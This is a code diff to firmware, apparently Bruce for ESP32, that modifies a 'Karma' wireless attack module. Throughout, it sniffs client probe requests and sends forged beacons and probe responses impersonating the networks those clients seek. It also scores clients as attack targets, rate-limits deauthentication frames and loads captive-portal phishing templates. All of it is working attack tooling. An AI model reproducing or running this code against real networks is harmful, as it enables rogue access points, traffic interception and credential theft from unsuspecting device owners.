@@ -36,8 +36,8 @@ const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
 #define MAX_PROBE_BUFFER 200
 #define MAC_CACHE_SIZE 100
 #define MAX_CLIENT_TRACK 30
-#define FAST_HOP_INTERVAL 250
-#define DEFAULT_HOP_INTERVAL 3000
+#define FAST_HOP_INTERVAL 500
+#define DEFAULT_HOP_INTERVAL 1000
 #define DEAUTH_INTERVAL 30000
 #define VULNERABLE_THRESHOLD 3
 #define AUTO_PORTAL_DELAY 2000
@@ -52,9 +52,11 @@ const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
 #define MAX_POPULAR_SSIDS 20
 #define MAX_NETWORK_HISTORY 30
 #define ACTIVE_PORTAL_CHANNEL 0
-#define PROBE_CHECK_INTERVAL 50
 #define MAX_DEAUTH_PER_SECOND 10
 #define DEAUTH_BURST_WINDOW 1000
+#define BEACON_BURST_SIZE 8
+#define BEACON_BURST_INTERVAL 60
+#define LISTEN_WINDOW 250
 
 const uint8_t vendorOUIs[][3] PROGMEM = {
     {0x00, 0x50, 0xF2}, {0x00, 0x1A, 0x11}, {0x00, 0x1B, 0x63}, {0x00, 0x24, 0x01},
@@ -82,9 +84,10 @@ const uint8_t ht_cap[] PROGMEM = {0xef, 0x09, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00
 const uint8_t rotate_channels[] PROGMEM = {1, 6, 11, 3, 8, 2, 7, 12, 4, 9, 5, 10, 13, 14};
 
 uint8_t activePortalChannel = 0;
-unsigned long lastProbeCheck = 0;
 unsigned long deauthCount[14] = {0};
 unsigned long lastDeauthReset = 0;
+unsigned long lastBeaconBurst = 0;
+uint8_t beaconsInBurst = 0;
 
 std::vector<String> SSIDDatabase::ssidCache;
 bool SSIDDatabase::cacheLoaded = false;
@@ -513,20 +516,12 @@ void addMACToCache(const String &mac) {
 }
 
 bool isProbeRequestWithSSID(const wifi_promiscuous_pkt_t *packet) {
-    if (!packet || packet->rx_ctrl.sig_len < 36) return false;
+    if (!packet || packet->rx_ctrl.sig_len < 24) return false;
     const uint8_t *frame = packet->payload;
     uint8_t frameType = (frame[0] & 0x0C) >> 2;
     uint8_t frameSubType = (frame[0] & 0xF0) >> 4;
     if (frameType != 0x00 || frameSubType != 0x04) return false;
-    uint8_t pos = 24;
-    while (pos + 1 < packet->rx_ctrl.sig_len) {
-        uint8_t tag = frame[pos];
-        uint8_t len = frame[pos + 1];
-        if (pos + 2 + len > packet->rx_ctrl.sig_len) return false;
-        if (tag == 0x00 && len > 0 && len <= 32) return true;
-        pos += 2 + len;
-    }
-    return false;
+    return true;
 }
 
 String extractSSID(const wifi_promiscuous_pkt_t *packet) {
@@ -537,13 +532,13 @@ String extractSSID(const wifi_promiscuous_pkt_t *packet) {
         uint8_t len = frame[pos + 1];
         if (tag == 0x00 && len > 0 && len <= 32 && (pos + 2 + len <= packet->rx_ctrl.sig_len)) {
             bool hidden = true;
-            bool printable = true;
             for (int i = 0; i < len; i++) {
-                uint8_t c = frame[pos + 2 + i];
-                if (c != 0x00) hidden = false;
-                if (c < 32 || c > 126) printable = false;
+                if (frame[pos + 2 + i] != 0x00) {
+                    hidden = false;
+                    break;
+                }
             }
-            if (hidden || !printable) return "";
+            if (hidden) return "*HIDDEN*";
             char ssid[len + 1];
             memcpy(ssid, &frame[pos + 2], len);
             ssid[len] = '\0';
@@ -551,7 +546,7 @@ String extractSSID(const wifi_promiscuous_pkt_t *packet) {
         }
         pos += 2 + len;
     }
-    return "";
+    return "*WILDCARD*";
 }
 
 String extractMAC(const wifi_promiscuous_pkt_t *packet) {
@@ -604,7 +599,7 @@ void analyzeClientBehavior(const ProbeRequest &probe) {
         behavior.probedSSIDs.push_back(probe.ssid);
         behavior.favoriteChannel = probe.channel;
         behavior.lastKarmaAttempt = 0;
-        behavior.isVulnerable = (probe.ssid.length() > 0);
+        behavior.isVulnerable = (probe.ssid.length() > 0 && probe.ssid != "*WILDCARD*");
         clientBehaviors[probe.mac] = behavior;
         uniqueClients++;
     } else {
@@ -621,7 +616,7 @@ void analyzeClientBehavior(const ProbeRequest &probe) {
         for (const auto &existingSSID : behavior.probedSSIDs) {
             if (existingSSID == probe.ssid) { ssidExists = true; break; }
         }
-        if (!ssidExists && probe.ssid.length() > 0 && behavior.probedSSIDs.size() < 5) {
+        if (!ssidExists && probe.ssid.length() > 0 && probe.ssid != "*WILDCARD*" && behavior.probedSSIDs.size() < 5) {
             behavior.probedSSIDs.push_back(probe.ssid);
             if (behavior.probedSSIDs.size() >= VULNERABLE_THRESHOLD) behavior.isVulnerable = true;
         }
@@ -641,6 +636,7 @@ uint8_t calculateAttackPriority(const ClientBehavior &client, const ProbeRequest
     if (sinceLast < 5000) score += 15;
     else if (sinceLast < 15000) score += 10;
     else if (sinceLast < 30000) score += 5;
+    if (probe.ssid == "*WILDCARD*") score = 0;
     return min(score, (uint8_t)100);
 }
 
@@ -707,7 +703,7 @@ size_t buildEnhancedProbeResponse(uint8_t *buffer, const String &ssid,
     }
     buffer[pos++] = 0x00;
     buffer[pos++] = isHidden ? 0x00 : (uint8_t)ssid.length();
-    if (!isHidden && ssid.length() > 0) {
+    if (!isHidden && ssid.length() > 0 && ssid != "*HIDDEN*" && ssid != "*WILDCARD*") {
         memcpy(&buffer[pos], ssid.c_str(), ssid.length());
         pos += ssid.length();
     }
@@ -784,7 +780,7 @@ size_t buildBeaconFrame(uint8_t *buffer, const String &ssid, uint8_t channel, co
     }
     buffer[pos++] = 0x00;
     buffer[pos++] = (uint8_t)ssid.length();
-    if (ssid.length() > 0) {
+    if (ssid.length() > 0 && ssid != "*HIDDEN*" && ssid != "*WILDCARD*") {
         memcpy(&buffer[pos], ssid.c_str(), ssid.length());
         pos += ssid.length();
     }
@@ -842,8 +838,10 @@ void sendBeaconFrameHelper(const String &ssid, uint8_t channel) {
     beaconPacket[pos++] = 0x04;
     beaconPacket[pos++] = 0x00;
     beaconPacket[pos++] = ssid.length();
-    memcpy(&beaconPacket[pos], ssid.c_str(), ssid.length());
-    pos += ssid.length();
+    if (ssid.length() > 0 && ssid != "*HIDDEN*" && ssid != "*WILDCARD*") {
+        memcpy(&beaconPacket[pos], ssid.c_str(), ssid.length());
+        pos += ssid.length();
+    }
     beaconPacket[pos++] = 0x01;
     beaconPacket[pos++] = sizeof(beacon_rates);
     memcpy_P(&beaconPacket[pos], beacon_rates, sizeof(beacon_rates));
@@ -880,8 +878,10 @@ void sendProbeResponse(const String &ssid, const String &mac, uint8_t channel) {
     probeResponse[pos++] = 0x04;
     probeResponse[pos++] = 0x00;
     probeResponse[pos++] = ssid.length();
-    memcpy(&probeResponse[pos], ssid.c_str(), ssid.length());
-    pos += ssid.length();
+    if (ssid.length() > 0 && ssid != "*HIDDEN*" && ssid != "*WILDCARD*") {
+        memcpy(&probeResponse[pos], ssid.c_str(), ssid.length());
+        pos += ssid.length();
+    }
     probeResponse[pos++] = 0x01;
     probeResponse[pos++] = sizeof(beacon_rates);
     memcpy_P(&probeResponse[pos], beacon_rates, sizeof(beacon_rates));
@@ -935,19 +935,28 @@ void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
 }
 
 void sendBeaconFrames() {
+    if (activePortalChannel > 0) return;
+    
     unsigned long now = millis();
-    if (now - lastBeaconTime < BEACON_INTERVAL_MS / 10) return;
-    lastBeaconTime = now;
-    size_t numNetworks = std::min(activeNetworks.size(), (size_t)MAX_CONCURRENT_SSIDS);
-    for (size_t i = 0; i < numNetworks; i++) {
-        if (activeNetworks[i].lastBeacon + BEACON_INTERVAL_MS < now) {
-            uint8_t beaconFrame[256];
-            size_t frameLen = buildBeaconFrame(beaconFrame, activeNetworks[i].ssid,
-                                              activeNetworks[i].channel, activeNetworks[i].rsn);
-            esp_wifi_set_channel(activeNetworks[i].channel, WIFI_SECOND_CHAN_NONE);
-            esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, frameLen, false);
-            activeNetworks[i].lastBeacon = now;
-            beaconsSent++;
+    
+    if (beaconsInBurst < BEACON_BURST_SIZE) {
+        if (now - lastBeaconBurst > BEACON_BURST_INTERVAL) {
+            if (!activeNetworks.empty()) {
+                uint8_t netIndex = beaconsInBurst % activeNetworks.size();
+                uint8_t beaconFrame[256];
+                size_t frameLen = buildBeaconFrame(beaconFrame, 
+                    activeNetworks[netIndex].ssid,
+                    activeNetworks[netIndex].channel, 
+                    activeNetworks[netIndex].rsn);
+                esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, frameLen, false);
+                beaconsSent++;
+            }
+            beaconsInBurst++;
+            lastBeaconBurst = now;
+        }
+    } else {
+        if (now - lastBeaconBurst > LISTEN_WINDOW) {
+            beaconsInBurst = 0;
         }
     }
 }
@@ -1002,6 +1011,7 @@ void queueProbeResponse(const ProbeRequest &probe, const RSNInfo &rsn) {
         else macBlacklist.erase(probe.mac);
     }
     if (responseQueue.size() >= 10) return;
+    if (probe.ssid == "*WILDCARD*") return;
     ProbeResponseTask task;
     task.ssid = probe.ssid;
     task.targetMAC = probe.mac;
@@ -1039,17 +1049,11 @@ void smartChannelHop() {
     
     unsigned long now = millis();
     if (now - last_ChannelChange < hop_interval) return;
-    if (channelActivity[channl] > 20) { hop_interval = DEFAULT_HOP_INTERVAL * 3; return; }
     currentPriorityChannel = (currentPriorityChannel + 1) % NUM_PRIORITY_CHANNELS;
     uint8_t channel = pgm_read_byte(&priorityChannels[currentPriorityChannel]);
     channl = channel - 1;
-    esp_wifi_set_promiscuous(false);
-    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
-    esp_wifi_set_channel(channel, secondCh);
-    delay(50);
-    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     last_ChannelChange = now;
-    hop_interval = DEFAULT_HOP_INTERVAL;
 }
 
 void updateChannelActivity(uint8_t channel) {
@@ -1066,7 +1070,7 @@ uint8_t getBestChannel() {
 }
 
 void updateSSIDFrequency(const String &ssid) {
-    if (ssid.isEmpty()) return;
+    if (ssid.isEmpty() || ssid == "*WILDCARD*") return;
     if (ssidFrequency.size() < MAX_POPULAR_SSIDS) {
         ssidFrequency[ssid]++;
     }
@@ -1194,16 +1198,13 @@ bool selectPortalTemplate(bool isInitialSetup) {
         }});
     }
     templateOptions.push_back({"Load Custom File", [=]() {
-        tft.fillScreen(bruceConfig.bgColor);
         drawMainBorderWithTitle("LOAD FROM");
         std::vector<Option> directOptions = {
             {"SD Card", [=]() {
-                tft.fillScreen(bruceConfig.bgColor);
                 drawMainBorderWithTitle("BROWSE SD");
-                FS *fs = nullptr;
                 if (setupSdCard()) {
-                    fs = &SD;
-                    String templateFile = loopSD(*fs, true, "HTML");
+                    FS &fs = SD;
+                    String templateFile = loopSD(fs, true, "HTML");
                     if (templateFile.length() > 0) {
                         PortalTemplate customTmpl;
                         customTmpl.name = "[SD] " + templateFile;
@@ -1222,30 +1223,25 @@ bool selectPortalTemplate(bool isInitialSetup) {
                         selectedTemplate = customTmpl;
                         templateSelected = true;
                         if (portalTemplates.size() < MAX_PORTAL_TEMPLATES) portalTemplates.push_back(customTmpl);
-                        tft.fillScreen(bruceConfig.bgColor);
                         drawMainBorderWithTitle("SELECTED");
                         displayTextLine(customTmpl.name);
                         delay(1500);
                         if (isInitialSetup) {
-                            tft.fillScreen(bruceConfig.bgColor);
                             drawMainBorderWithTitle("KARMA SETUP");
                             displayTextLine("Selected: " + customTmpl.name);
                             delay(1000);
                         }
                     }
-                    SD.end();
                 } else {
                     displayTextLine("SD Card failed!");
                     delay(1000);
                 }
             }},
             {"LittleFS", [=]() {
-                tft.fillScreen(bruceConfig.bgColor);
                 drawMainBorderWithTitle("BROWSE LITTLEFS");
-                FS *fs = nullptr;
                 if (LittleFS.begin()) {
-                    fs = &LittleFS;
-                    String templateFile = loopSD(*fs, true, "HTML");
+                    FS &fs = LittleFS;
+                    String templateFile = loopSD(fs, true, "HTML");
                     if (templateFile.length() > 0) {
                         PortalTemplate customTmpl;
                         customTmpl.name = "[FS] " + templateFile;
@@ -1264,12 +1260,10 @@ bool selectPortalTemplate(bool isInitialSetup) {
                         selectedTemplate = customTmpl;
                         templateSelected = true;
                         if (portalTemplates.size() < MAX_PORTAL_TEMPLATES) portalTemplates.push_back(customTmpl);
-                        tft.fillScreen(bruceConfig.bgColor);
                         drawMainBorderWithTitle("SELECTED");
                         displayTextLine(customTmpl.name);
                         delay(1500);
                         if (isInitialSetup) {
-                            tft.fillScreen(bruceConfig.bgColor);
                             drawMainBorderWithTitle("KARMA SETUP");
                             displayTextLine("Selected: " + customTmpl.name);
                             delay(1000);
@@ -1284,6 +1278,7 @@ bool selectPortalTemplate(bool isInitialSetup) {
             {"Back", [=]() {}}
         };
         loopOptions(directOptions);
+        drawMainBorderWithTitle("SELECT TEMPLATE");
     }});
     templateOptions.push_back({"Disable Auto-Portal", [=]() {
         karmaConfig.enableAutoPortal = false;
@@ -1545,13 +1540,6 @@ void saveProbesToPCAP(FS &fs) {
 void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (type != WIFI_PKT_MGMT) return;
     
-    if (activePortalChannel > 0) {
-    } else {
-        unsigned long now = millis();
-        if (now - lastProbeCheck < PROBE_CHECK_INTERVAL) return;
-        lastProbeCheck = now;
-    }
-    
     wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
     wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
     const uint8_t *frame = pkt->payload;
@@ -1567,7 +1555,7 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     
     String mac = extractMAC(pkt);
     String ssid = extractSSID(pkt);
-    if (mac.isEmpty() || ssid.isEmpty()) return;
+    if (mac.isEmpty()) return;
     
     String cacheKey = mac + ":" + ssid;
     if (isMACInCache(cacheKey)) return;
@@ -1602,7 +1590,7 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     updateChannelActivity(probe.channel);
     updateSSIDFrequency(probe.ssid);
     
-    if (broadcastAttack.isActive() && SSIDDatabase::contains(ssid)) {
+    if (broadcastAttack.isActive() && ssid != "*WILDCARD*" && SSIDDatabase::contains(ssid)) {
         handleBroadcastResponse(ssid, mac);
     }
     
@@ -1695,7 +1683,7 @@ std::vector<ProbeRequest> getUniqueProbes() {
     for (int i = 0; i < count; i++) {
         int idx = (start + i) % MAX_PROBE_BUFFER;
         const ProbeRequest &probe = probeBuffer[idx];
-        if (probe.ssid.isEmpty()) continue;
+        if (probe.ssid.isEmpty() || probe.ssid == "*WILDCARD*") continue;
         String key = probe.mac + ":" + probe.ssid;
         if (seen.find(key) == seen.end()) {
             seen.insert(key);
@@ -1823,7 +1811,6 @@ void karma_setup() {
     generateRandomBSSID(currentBSSID);
     lastMACRotation = millis();
     
-    tft.fillScreen(bruceConfig.bgColor);
     drawMainBorderWithTitle("MODERN KARMA ATTACK");
     displayTextLine("Enhanced Karma v2.0");
     delay(500);
@@ -1874,6 +1861,8 @@ void karma_setup() {
     
     ensureWifiPlatform();
     
+    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
+    esp_wifi_set_promiscuous_filter(&filter);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
     wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
@@ -2218,7 +2207,7 @@ void saveProbesToFile(FS &fs, bool compressed) {
             for (int i = 0; i < count; i++) {
                 int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                 const ProbeRequest &probe = probeBuffer[idx];
-                if (probe.ssid.isEmpty()) continue;
+                if (probe.ssid.isEmpty() || probe.ssid == "*WILDCARD*") continue;
                 uint32_t timestamp = probe.timestamp;
                 file.write((uint8_t*)&timestamp, 4);
                 file.write((uint8_t*)probe.mac.c_str(), 17);
@@ -2227,7 +2216,7 @@ void saveProbesToFile(FS &fs, bool compressed) {
                 file.write((uint8_t*)&probe.channel, 1);
                 uint8_t ssidLen = (uint8_t)probe.ssid.length();
                 file.write(&ssidLen, 1);
-                if (ssidLen > 0) file.write((uint8_t*)probe.ssid.c_str(), ssidLen);
+                if (ssidLen > 0 && probe.ssid != "*HIDDEN*") file.write((uint8_t*)probe.ssid.c_str(), ssidLen);
             }
             file.close();
         }
@@ -2240,7 +2229,7 @@ void saveProbesToFile(FS &fs, bool compressed) {
             for (int i = 0; i < count; i++) {
                 int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                 const ProbeRequest &probe = probeBuffer[idx];
-                if (probe.ssid.length() > 0) {
+                if (probe.ssid.length() > 0 && probe.ssid != "*WILDCARD*") {
                     file.printf("%lu,%s,%d,%d,\"%s\"\n", probe.timestamp, probe.mac.c_str(),
                                probe.rssi, probe.channel, probe.ssid.c_str());
                 }
